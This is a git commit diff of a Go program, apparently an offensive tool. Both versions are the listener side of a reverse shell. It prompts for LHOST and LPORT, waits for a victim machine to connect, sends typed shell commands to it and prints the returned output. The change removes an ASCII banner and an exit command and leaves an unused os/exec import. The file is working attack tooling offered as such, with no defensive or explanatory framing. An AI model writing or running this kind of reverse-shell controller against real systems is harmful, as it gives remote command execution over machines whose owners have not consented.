198c212df296c299ab55f4a246bedbad989608e3
Fhchcjcjcjcjvkkvk <info@infopeklo.cz>
2024-12-24 17:04:26 +0100

    Update 0.go

--- 0.go
+++ 0.go
@@ -1,90 +1,58 @@
 package main
 
 import (
-	"bufio"
 	"fmt"
 	"net"
 	"os"
+	"os/exec"
+	"bufio"
 	"strings"
 )
 
-// Function to print banner in blue
-func printBanner() {
-	// ANSI escape code for blue text
-	const blue = "\033[34m"
-	const reset = "\033[0m"
-	
-	// Print the banner in blue using raw string literal (backticks)
-	banner := `
-  _    __   ___   ___| |_ ___ _ __ ___ _ __ __ _  ___| | __
- | '_ \` _ \ / _ \ __/ _ \ '__/ __| '__/ _\` |/ __| |/ /
- | | | | | |  __/ ||  __/ | | (__| | | (_| | (__|   <
- |_| |_| |_|\___|\__\___|_|  \___|_|  \__,_|\___|_\_\
- `
-	fmt.Println(blue + banner + reset)
-}
-
 func main() {
-	// Print the banner when the server starts
-	printBanner()
-
-	// Get LHOST and LPORT from user
-	var lhost string
-	var lport string
-
+	// Get LHOST and LPORT from user input
+	reader := bufio.NewReader(os.Stdin)
 	fmt.Print("ENTER LHOST: ")
-	fmt.Scanln(&lhost)
+	lhost, _ := reader.ReadString('\n')
+	lhost = strings.TrimSpace(lhost)
+	
 	fmt.Print("ENTER LPORT: ")
-	fmt.Scanln(&lport)
+	lport, _ := reader.ReadString('\n')
+	lport = strings.TrimSpace(lport)
 
-	// Listen on the specified LHOST and LPORT
-	listenAddr := fmt.Sprintf("%s:%s", lhost, lport)
-	listener, err := net.Listen("tcp", listenAddr)
+	// Listen on the specified IP and port
+	listenAddress := lhost + ":" + lport
+	ln, err := net.Listen("tcp", listenAddress)
 	if err != nil {
-		fmt.Println("Error starting server:", err)
+		fmt.Println("Error starting listener:", err)
 		return
 	}
-	defer listener.Close()
+	defer ln.Close()
 
-	fmt.Printf("Listening on %s...\n", listenAddr)
+	fmt.Println("Listening on", listenAddress)
 
-	// Accept incoming connection
-	conn, err := listener.Accept()
+	// Accept incoming connections
+	conn, err := ln.Accept()
 	if err != nil {
 		fmt.Println("Error accepting connection:", err)
 		return
 	}
 	defer conn.Close()
 
-	// Send a welcome message
-	conn.Write([]byte("Connected! You can start typing commands.\n"))
-
-	// Interactive loop to send commands to the client
-	reader := bufio.NewReader(os.Stdin) // to read commands from server's terminal
+	// Interact with the client
+	fmt.Println("Client connected!")
 	for {
-		fmt.Print("shell> ") // Server prompt
-		command, _ := reader.ReadString('\n')
-		command = strings.TrimSpace(command)
+		// Prompt for shell commands
+		fmt.Print("Shell> ")
+		cmdInput, _ := reader.ReadString('\n')
+		cmdInput = strings.TrimSpace(cmdInput)
 
-		// If the user types "exit", disconnect the client and exit the server
-		if command == "exit" {
-			conn.Write([]byte("Exiting... Bye!\n"))
-			fmt.Println("Exiting server...")
-			return
-		}
+		// Send the command to the client
+		conn.Write([]byte(cmdInput + "\n"))
 
-		// Send command to the client (reverse shell)
-		conn.Write([]byte(command + "\n"))
-
-		// Receive the output of the command from the client
-		output := make([]byte, 1024)
-		n, err := conn.Read(output)
-		if err != nil {
-			fmt.Println("Error reading from client:", err)
-			return
-		}
-
-		// Print the command output
-		fmt.Printf("Output:\n%s\n", string(output[:n]))
+		// Receive the command output from the client
+		buffer := make([]byte, 1024)
+		n, _ := conn.Read(buffer)
+		fmt.Println("Output:\n" + string(buffer[:n]))
 	}
 }
